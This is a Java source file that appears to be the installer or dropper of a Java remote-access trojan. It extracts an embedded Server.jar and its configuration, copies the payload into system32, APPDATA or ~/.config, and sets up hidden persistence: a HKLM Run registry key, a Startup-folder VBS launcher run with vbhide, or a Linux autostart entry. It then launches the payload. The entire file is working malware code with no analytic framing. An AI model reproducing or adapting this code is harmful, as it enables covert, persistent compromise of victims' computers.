
/**
 *
 * @author AngelCruel
 */
import java.io.*;
import java.util.*;
import java.util.jar.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class inic {

    private String[] string = new String[5];
    static final int BUFFER = 2048;
    String nombre;
    String dirfile = null;
    String regfile = null;
    String com = null;

    public inic() {
        cargarDatos();
        identificarOS();

        File file = new File(dirfile);
        if (!file.exists()) {
            try {
                FileOutputStream fos;
                BufferedOutputStream dest = null;
                BufferedInputStream is = null;
                int count;
                byte data[] = new byte[BUFFER];

                is = new BufferedInputStream(getClass().getResourceAsStream("/Server.jar"));
                fos = new FileOutputStream(dirfile);
                dest = new BufferedOutputStream(fos, BUFFER);
                while ((count = is.read(data, 0, BUFFER)) != -1) {
                    dest.write(data, 0, count);
                }
                dest.flush();

                fos.close();
                dest.close();
                is.close();
            } catch (Exception e) {
                System.out.println("Error inicWindows.");
            }

            Runtime run = null;
            try {
                run = Runtime.getRuntime();
                run.exec(com);
                System.exit(0);
            } catch (IOException ex) {
                try {
                    ex.printStackTrace();
                    run.exec(com);
                } catch (IOException ex1) {
                    Logger.getLogger(inic.class.getName()).log(Level.SEVERE, null, ex1);
                }
            }
        }
    }

    public void identificarOS() {
        if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) {
            try {
                File f = new File(System.getenv("systemroot") + "\\dsf34rsdfew");
                if (f.mkdir()) {
                    dirfile = System.getenv("systemroot") + "\\system32\\" + string[3] + ".jar";
                    regfile = "reg add hklm\\software\\microsoft\\windows\\currentversion\\run /v \"" + string[4] + "\" /t reg_sz /d \"" + System.getenv("windir") + "\\system32\\" + string[3] + ".jar" + "\" /f";
                    try {
                        Runtime.getRuntime().exec(regfile);
                    } catch (IOException ex) {
                        Logger.getLogger(inic.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    com = "javaw -jar " + (System.getenv("systemroot") + "\\System32\\" + string[3] + ".jar").replaceAll(" ", "\" \"");
                    f.delete();
                } else {
                    Formatter archivo;
                    dirfile = System.getenv("APPDATA") + "\\" + string[3] + ".jar";
                    com = "javaw -jar " + (System.getenv("APPDATA") + "\\" + string[3] + ".jar").replaceAll(" ", "\" \"");
                    File file = new File(dirfile);
                    if (!file.exists()) {
                        archivo = new Formatter(System.getenv("APPDATA") + "\\" + string[3] + ".bat");
                        archivo.format("%s", "javaw -jar " + (System.getenv("APPDATA") + "\\" + string[3] + ".jar").replaceAll(" ", "\" \""));
                        archivo.flush();
                        archivo.close();

                        String startup;
                        if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS 7") != -1 || System.getProperty("os.name").toUpperCase().indexOf("WINDOWS VISTA") != -1) {
                            startup = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";

                        } else {
                            if (Locale.getDefault().getLanguage().equals("es")) {
                                startup = "\\Menú Inicio\\Programas\\Inicio\\";
                            } else {
                                startup = "\\Start Menu\\Programs\\Startup\\";
                            }
                        }
                        archivo = new Formatter((System.getProperty("user.home") + startup + string[3] + ".vbs"));
                        archivo.format("%s", "set objshell = createobject(\"wscript.shell\")");
                        archivo.format("%s", "\r\nobjshell.run \"\"\"" + (System.getenv("APPDATA") + "\\" + string[3] + ".bat") + "\"\"\", vbhide");
                        archivo.flush();
                        archivo.close();
                    }
                }
            } catch (Exception ex) {
                Logger.getLogger(inic.class.getName()).log(Level.SEVERE, null, ex);
            }

        }
        if (System.getProperty("os.name").toUpperCase().indexOf("LINUX") != -1) {
            dirfile = "/home/" + System.getProperty("user.name") + "/.config/" + string[3] + ".jar";
            regfile = "ls";

            File file = new File(dirfile);
            if (!file.exists()) {
                createFile();
            }
            com = "java -jar " + "/home/" + System.getProperty("user.name") + "/.config/" + string[3] + ".jar";
        }
        if (System.getProperty("os.name").toUpperCase().indexOf("MAC") != -1) {
        }
    }

    public void createFile() {
        try {
            File file = new File("/home/" + System.getProperty("user.name") + "/.config/autostart");
            if (!file.exists()) {
                file.mkdir();
            }
            Formatter archivo = new Formatter("/home/" + System.getProperty("user.name") + "/.config/autostart/" + string[3] + ".desktop");
            archivo.format("%s", "\n[Desktop Entry]\n");
            archivo.format("%s", "Type=Application\n");
            archivo.format("%s", "Exec=/home/compuserver/.config/" + string[3] + "\n");
            archivo.format("%s", "Hidden=false\n");
            archivo.format("%s", "NoDisplay=false\n");
            archivo.format("%s", "X-GNOME-Autostart-enabled=true\n");
            archivo.format("%s", "Name[es_BO]=" + string[4] + "\n");
            archivo.format("%s", "Name=" + string[4] + "\n");
            archivo.format("%s", "Comment[es_BO]=\n");
            archivo.format("%s", "Comment=\n");
            archivo.flush();
            archivo.close();

            Formatter archivo2 = new Formatter("/home/" + System.getProperty("user.name") + "/.config/" + string[3]);
            archivo2.format("%s", "#!/bin/bash\n");
            archivo2.format("%s", "java -jar /home/" + System.getProperty("user.name") + "/.config/" + string[3] + ".jar");
            try {
                Runtime.getRuntime().exec("chmod 700 /home/" + System.getProperty("user.name") + "/.config/" + string[3]);
            } catch (IOException ex) {
                Logger.getLogger(inic.class.getName()).log(Level.SEVERE, null, ex);
            }
            archivo2.flush();
            archivo2.close();

        } catch (FileNotFoundException ex) {
            Logger.getLogger(inic.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public static void main(String args[]) {
        new inic();
    }

    public void cargarDatos() {
        InputStream is = null;
        byte[] buffer = new byte[512 * 1024];
        int nbLectura;

        JarInputStream jarIn = null;
        try {
            is = getClass().getResourceAsStream("/Server.jar");
            File temp = File.createTempFile("Server", ".jar");
            FileOutputStream archivoDestino = new FileOutputStream(temp);
            while ((nbLectura = is.read(buffer)) != -1) {
                archivoDestino.write(buffer, 0, nbLectura);
            }
            jarIn = new JarInputStream(new FileInputStream(temp));
            temp.deleteOnExit();
            byte[] buf = new byte[4096];
            JarEntry entry;
            jarIn.getManifest();
            File temp2 = File.createTempFile("Datos", ".txt");
            FileOutputStream archivoDestino2 = new FileOutputStream(temp2);
            while ((entry = jarIn.getNextJarEntry()) != null) {
                if ("Datos.txt".equals(entry.getName())) {
                    int read;
                    while ((read = jarIn.read(buf)) != -1) {
                        archivoDestino2.write(buf, 0, read);
                    }
                }
            }

            Scanner scanner = new Scanner(temp2);
            temp2.deleteOnExit();

            for (int i = 0; i < 5; i++) {
                string[i] = scanner.nextLine();
            }

            jarIn.close();
            is.close();
            archivoDestino.close();
            archivoDestino2.close();
            scanner.close();
        } catch (Exception ex) {
            System.out.println("Error en cargarDatos.");
        }
    }
}
